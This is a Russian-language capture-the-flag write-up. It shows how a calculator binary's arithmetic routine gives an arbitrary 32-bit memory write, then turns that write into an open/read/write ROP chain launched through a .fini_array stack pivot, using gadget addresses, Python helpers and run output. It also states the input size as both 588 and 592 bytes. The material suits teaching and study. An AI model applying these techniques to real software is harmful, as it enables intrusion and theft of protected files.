# pocket calculator: путь решения

[English version](solve.md)

## 0. Общий план

Перед нами обычный на первый взгляд калькулятор. Но внутри арифметической операции один операнд может стать адресом памяти, а другой — четырёхбайтовым значением для записи. Переполнять буфер стека или взламывать специальный аллокатор не нужно: управляемой записи уже достаточно.

Общий путь:

1. Исследовать оригинальный ELF и найти примитив записи в `Operation::apply`.
2. Научиться записывать 32-битные значения при помощи команд калькулятора в RPN.
3. Выбрать доступную для записи память под путь, буфер и поддельный стек; найти гаджеты по фиксированным адресам.
4. Собрать цепочку ORW (open/read/write/exit) из 30 восьмибайтовых слов.
5. Подменить последнюю запись массива инициализации и две записи массива финализации, затем штатно завершить программу.
6. При завершении через две последовательные инструкции `leave; ret` перенести стек на нашу цепочку.
7. Получить флаг из stdout.

Боевой скрипт выполняет 35 записей, его вход составляет 588 байт. Эти числа пересчитаны непосредственно из сохранившегося решателя, а не взяты из приблизительной оценки в отчёте.

## 1. Что предоставили организаторы

В архиве находится статический бинарник `challenge`, ядро гостевой системы `bzImage`, образ корневой файловой системы QEMU, обработчик сессий и файлы запуска и конфигурации. См. [перечень материалов](assets/README.md). Проверены контрольные суммы всех 16 файлов. Бинарник занимает 2 580 760 байт, ELF x86-64, таблица символов не удалена, точка входа 0x405200.

Из распакованного каталога полезно выполнить:

```sh
sha256sum -c sha256sum
file challenge
readelf -hW challenge
readelf -lW challenge
readelf -SW challenge
nm -nC challenge
```

Тип ELF — EXEC, не DYN. Бинарник собран без PIE, значит адреса кода и глобальных данных фиксированы и утечка базы образа нам не нужна. Статическая линковка означает, что необходимый код libc и C++ находится внутри самого файла. GNU_STACK имеет разрешения RW, без исполнения. Поэтому используем уже существующий исполняемый код, а не пытаемся запустить машинные инструкции из стека.

Сегмент GNU_RELRO отсутствует. Массивы инициализации и финализации, глобальные данные и BSS входят в RW-сегмент. Это согласуется с флагом линковки `-Wl,-z,norelro` в Makefile. Там же указаны clang++-23 и `-fsanitize=alloc-token`. Исходника main.cpp в комплекте нет, и разбирать внутренности механизма выделения памяти для данного решения не потребовалось.

| Область | Начало | Разрешения |
| --- | --- | --- |
| Исполняемый LOAD | 0x401000 | R E |
| LOAD только для чтения / .rodata | 0x57a000 | R |
| Доступный для записи LOAD | 0x5e4240 | RW |
| .init_array | 0x5e42c8 | RW |
| .fini_array | 0x5e4328 | RW |
| .data | 0x5f0060 | RW |
| .bss | 0x5f1c20 | RW |

Почему это важно: записать новый адрес прямо в таблицу виртуальных функций в .rodata не получится, зато можно изменить указатели, которые программа использует при завершении.

## 2. Находим примитив записи

Калькулятор поддерживает режимы RPN и ALG. RPN — обратная польская запись: сначала числа помещаются на стек, затем выполняется операция. Если ввести A, B, +, то A окажется в Y, а B — в X.

В таблице символов обнаруживается `Operation::apply(Number const&, Number const&) const` по адресу 0x4070c0. Смотрим дизассемблирование:

```asm
4070f4: mov eax,DWORD PTR [rdx+0x8]
4070f7: mov ecx,DWORD PTR [rsi+0x8]
4070fa: test eax,eax
4070fc: je 407109
4070fe: cmp eax,0x400000
407103: jb 40710b
407105: mov DWORD PTR [rax],ecx
407107: jmp 40710b
407109: mov DWORD PTR [rdx],ecx
```

Главная инструкция находится по адресу 0x407105. EAX и ECX заполняются значениями из двух объектов операндов. На x86-64 запись в EAX обнуляет старшие 32 бита RAX. Беззнаковое сравнение пропускает запись при ненулевых значениях меньше 0x400000. Если значение не меньше 0x400000, процессор записывает четыре байта второго операнда по адресу из первого.

Псевдокод интересующей нас ветки:

```c
uint32_t a = Y_bits;
uint32_t b = X_bits;
if (a >= 0x400000)
    *(uint32_t *)(uintptr_t)a = b;
```

Есть также отдельная ветка при нулевом значении, которая пишет непосредственно в объект; её не используем. После записи по адресу 0x40710b выполнение обычной арифметики продолжается. То есть операция сложения не просто заменена записью: запись является опасным побочным эффектом.

Точные инструкции можно посмотреть так:

```sh
objdump -d -Mintel --start-address=0x4070c0 --stop-address=0x407194 challenge
```

Например, при первоначальном исследовании последовательностью десятичных чисел 6226040, 0, + проверялась запись по адресу 0x5f0078. Это изменение глобальных данных программы, а не безвредное сложение. В финальном решении используем только специально выбранные адреса.

## 3. Превращаем операции калькулятора в запись памяти

Необходимо передавать любые 32-битные комбинации. Калькулятор принимает десятичные знаковые целые, поэтому значения от 0x80000000 нужно представить в знаковой форме.

```python
def signed32(x):
    x &= 0xffffffff
    return x if x < 0x80000000 else x - 0x100000000

def write32(addr, val):
    ops.extend([str(addr), str(signed32(val)), '+'])
```

Например, 0xffffffff передаём как -1, но четыре байта остаются ff ff ff ff.

Архитектура little-endian: младшая часть числа находится по меньшему адресу. Восьмибайтовый указатель можно разделить на младшее и старшее 32-битные слова и записать по адресам A и A+4. Рабочий скрипт пропускает нулевые qword в области поддельного стека, а также нулевые старшие половины, если соответствующие байты уже равны нулю. Для трёх изменяемых указателей финального перехвата он явно записывает обе половины, чтобы не зависеть от старых данных.

Строка делится на четырёхбайтовые блоки с помощью struct.unpack('<I', ...), последний блок дополняется нулевыми байтами. Строка '/flag.txt' вместе с завершающим NUL занимает три операции записи.

Примитив имеет ограничения: можно писать в доступные для записи отображённые адреса, представимые 32-битным значением, а не в любой произвольный 64-битный адрес. Все выбранные адреса укладываются в допустимый диапазон.

## 4. Выбираем память и гаджеты

Рабочий скрипт использует следующие адреса:

| Назначение | Адрес |
| --- | --- |
| Буфер чтения (в .bss) | 0x60b000 |
| Строка пути с NUL | 0x60cee0 |
| Поддельный стек | 0x60cf00 |
| Последняя запись .init_array | 0x5e4320 |
| Первая запись .fini_array | 0x5e4328 |
| Вторая запись .fini_array | 0x5e4330 |

Здесь есть важная тонкость: формальная граница .bss и RW-сегмента находится по адресу 0x60ce98, а не 0x60d000. Путь и поддельный стек лежат в нулевом хвосте последней отображённой страницы. Linux отображает память страницами, поэтому при округлении вверх до границы 4 КиБ получаем 0x60d000. Возможность использования этого хвоста зависит от конкретной раскладки; на оригинальном ELF она подтверждена успешным запуском. Цепочка содержит 30 qword (240 байт) и заканчивается по адресу 0x60cff0, не выходя за границу страницы. Буфер на 0x100 байт лежит отдельно, внутри .bss.

Для выполнения системных вызовов необходимо управлять регистрами. Гаджет — короткая последовательность уже существующих инструкций с завершающим ret. Инструкция ret берёт следующий адрес из стека, поэтому подготовленная последовательность qword позволяет выбирать следующий гаджет.

Следующие инструкции дополнительно проверены дизассемблированием оригинального файла:

| Гаджет | Адрес |
| --- | --- |
| pop rax; ret | 0x447c0a |
| pop rdi; ret | 0x40cc67 |
| pop rsi; ret | 0x40e14f |
| pop rdx; ret | 0x4249d2 |
| syscall; ret | 0x4fd432 |
| xchg edi,eax; ret | 0x5537b6 |
| leave; ret | 0x4c1087 |

Например, `objdump -d -Mintel --start-address=0x5537b6 --stop-address=0x5537b8 challenge` подтверждает, что гаджет переноса файлового дескриптора — именно xchg edi,eax; ret.

## 5. Почему достаточно прочитать файл: устройство гостя

Организаторы предоставили QEMU-окружение с гостевым Linux 6.10.2 и образом корневой файловой системы. Файл флага передаётся гостю вторым виртуальным диском. Внутри гостя init-скрипт S97flag выполняет:

```sh
cat /dev/sdb > /flag.txt
chown root:root /flag.txt
chmod 0444 /flag.txt
```

Обработчик session-runner запускает непривилегированный процесс калькулятора для каждого соединения. Он выставляет RLIMIT_CPU=35, RLIMIT_AS=128 МиБ, RLIMIT_NPROC=8, RLIMIT_FSIZE=0, сбрасывает права пользователя и групп, включает no_new_privs. Родительский процесс ставит таймер на 30 секунд.

Флаг в гостевой системе читается непривилегированным процессом благодаря правам 0444. Поэтому не нужен выход из QEMU, повышение привилегий или запуск командной оболочки. RLIMIT_FSIZE ограничивает запись в обычные файлы, а не чтение флага и отправку байтов в stdout. Достаточно небольшой цепочки в рамках одной сессии.

## 6. Собираем ORW-цепочку

Номера системных вызовов Linux x86-64 и аргументы:

| Вызов | RAX | RDI | RSI | RDX |
| --- | --- | --- | --- | --- |
| open | 2 | PATH | 0 (O_RDONLY) | не используется без O_CREAT |
| read | 0 | полученный fd | BUF | 0x100 |
| write | 1 | 1 (stdout) | BUF | 0x100 |
| exit | 60 | 0 | не используется | не используется |

open возвращает файловый дескриптор в RAX. Вместо предположения, что дескриптор обязательно будет равен 3, переносим фактически возвращённое значение в RDI инструкцией xchg edi,eax; ret.

Поддельный стек в символическом виде:

```text
0                         # фиктивный сохранённый RBP
POP_RAX, 2
POP_RDI, PATH
POP_RSI, 0
SYSCALL_RET               # open
XCHG_EDI_EAX              # fd -> RDI
POP_RSI, BUF
POP_RDX, 0x100
POP_RAX, 0
SYSCALL_RET               # read
POP_RDI, 1
POP_RSI, BUF
POP_RDX, 0x100
POP_RAX, 1
SYSCALL_RET               # write
POP_RAX, 60
POP_RDI, 0
SYSCALL_RET               # exit
```

Первое восьмибайтовое слово — не адрес гаджета. При переносе стека оно попадёт в RBP. Следующее слово — первый реальный адрес возврата.

Цепочка не проверяет ошибки системных вызовов и не учитывает длину, возвращённую read. Она всегда отправляет 256 байт. Этим объясняются завершающие нулевые байты при успешном локальном запуске и отсутствие полезного результата в первом тесте без файла. В данном случае буфер изначально нулевой. Заключительный SYS_exit позволяет не возвращаться в повреждённое состояние приложения.

## 7. Точный перехват управления: двойной stack pivot

Самая интересная часть задачи. В первоначальном отчёте агента механизм перехвата был связан с __exit_funcs по адресу 0x5f05d0. Однако сохранённый рабочий скрипт вообще не записывает по этому адресу. Его код и дизассемблирование оригинального ELF показывают другой, точно определяемый механизм.

Решатель подменяет последнюю запись .init_array по адресу 0x5e4320 и обе записи .fini_array по адресам 0x5e4328 и 0x5e4330:

```python
write64(INIT_LAST, SCRATCH)
write64(FARRAY, LEAVE_RET)
write64(FARRAY+8, LEAVE_RET)
ops.append('quit')
```

Зачем нужен указатель прямо перед .fini_array? Рассмотрим функцию статической libc call_fini по адресу 0x4c4be0:

```asm
4c4be1: lea rax,[rip+0x11f740]  # 0x5e4328
4c4be9: lea rbx,[rip+0x11f748]  # 0x5e4338
4c4bf0: sub rbx,rax
4c4bf7: sar rbx,0x3
4c4bfd: lea rbp,[rax-0x8]
4c4c10: call QWORD PTR [rbp+rbx*8]
4c4c14: sub rbx,0x1
4c4c18: jne 4c4c10
```

Несвязанные инструкции опущены. RBX принимает значение (0x5e4338 - 0x5e4328)/8 = 2. RBP устанавливается в 0x5e4320. Значит, первый косвенный вызов берёт указатель по адресу 0x5e4330. Мы уже заменили его на LEAVE_RET.

Инструкция leave эквивалентна mov rsp,rbp; pop rbp. Затем ret берёт следующее слово со стека и использует его как адрес продолжения. Получаем два последовательных шага:

| Этап | RSP после установки в leave | Новый RBP (pop) | Следующий RIP (ret) |
| --- | --- | --- | --- |
| Первый leave; ret | 0x5e4320 | [0x5e4320] = SCRATCH | [0x5e4328] = LEAVE_RET |
| Второй leave; ret | SCRATCH | [SCRATCH] = 0 | [SCRATCH+8] = POP_RAX |

После второго гаджета RSP равен SCRATCH+16. POP_RAX забирает число 2, начиная подготовку первого системного вызова. Утечка адреса настоящего стека не нужна.

Это не два независимых способа перехвата при завершении. Это единая двухступенчатая конструкция, использующая массив финализации и предшествующую ему ячейку. Последняя запись .init_array уже выполнила свою функцию при старте программы, а теперь служит данными для leave. Обычный цикл call_fini больше не продолжится: управление переходит на поддельный стек, а цепочка заканчивается SYS_exit.

Указатели триггера записываются последними, когда путь и цепочка уже готовы. Все команды передаются одним текстовым блоком с завершающей командой quit.

## 8. Неудачные подходы и что мы из них узнали

- Перезапись vtable в .rodata потребовала бы записи в R-only отображение. После проверки разрешений ELF эту область исключили. Отдельная трасса падения при записи в .rodata не сохранилась.
- Искать переполнение стека или разбирать внутренности аллокатора не потребовалось, потому что уже имелся подходящий примитив записи. Это не означает, что все альтернативные методы исчерпывающе исследованы.
- В исходном отчёте упоминались __exit_funcs и падение при ранней подмене триггера. Реальный скрипт и бинарник подтверждают именно цепочку .init_array/.fini_array; отдельного рабочего эксплойта через __exit_funcs и сырого лога падения нет.
- Первый локальный запуск не смог прочитать /flag.txt, поскольку гостевой файл отсутствовал на хосте. Изменили только путь на /tmp/pcflag и получили синтетический флаг. Исходный калькулятор изменять не пришлось.

## 9. Воспроизведение

Возьмите оригинальный архив из материалов соревнования и сверьте контрольные суммы по [assets/README.md](assets/README.md). Тяжёлые образы и бинарники не дублируются в репозитории. Используйте отдельное изолированное Linux-окружение.

Из каталога райтапа, после помещения исходного архива в assets/:

```sh
mkdir -p /tmp/pc
tar -xzf assets/pocket-calculator.tar.gz -C /tmp/pc
(cd /tmp/pc/pocket-calculator && sha256sum -c sha256sum)
printf 'gctf{LOCAL_TEST_OK}\n' > /tmp/pcflag
python3 scripts/local_test_exploit.py --local /tmp/pc/pocket-calculator/challenge
```

Решателю достаточно стандартной библиотеки Python. Бинарник статический, поэтому для такого локального теста полноценное развёртывание QEMU не требуется. Для проверки полной инфраструктуры с заглушкой флага можно использовать исходные deploy.sh и QEMU.md, Docker и /dev/kvm. Этот вариант при подготовке райтапа повторно не запускался.

Боевой решатель читает /flag.txt, локальный отличается путём /tmp/pcflag. В обеих публикуемых версиях адрес подключения по умолчанию заменён на loopback; остальная реализация сохранена. К завершившему работу боевому инстансу повторно не подключались.

## 10. Итог

В сохранившейся переписке с соревнования зафиксирован флаг после сообщения о завершении SecureHeap:

```text
SecureHeap destruction...
SecureHeap destruction done
gctf{...}
FLAGS: ['gctf{...}']
```

При подготовке райтапа мы независимо повторили локальный тест исходным скриптом на оригинальном ELF с проверенной контрольной суммой:

```text
ROP words=30, ends=0x60cff0
Writes=35, bytes_input=592
LOCAL exit= 0
...
SecureHeap destruction done
gctf{LOCAL_TEST_OK}
FLAGS: ['gctf{LOCAL_TEST_OK}']
```

В evidence опубликована выдержка нового локального запуска. Полный stdout также содержит нулевое дополнение из-за записи фиксированной длины. Настоящий флаг в исторической выдержке замаскирован.

## 11. Вывод

Основная ошибка — возможность интерпретировать операнд калькулятора как сырой адрес без проверки корректности объекта и границ памяти. Безопасная работа с памятью и строгая типизация операндов устранили бы сам примитив. PIE и full RELRO дополнительно препятствовали бы перехвату управления по фиксированным адресам; специальный аллокатор сам по себе не защищает от такой записи. Доступ к секретным файлам также следует ограничивать согласно модели угроз. В данной CTF-задаче флаг намеренно доступен для ORW-эксплуатации.
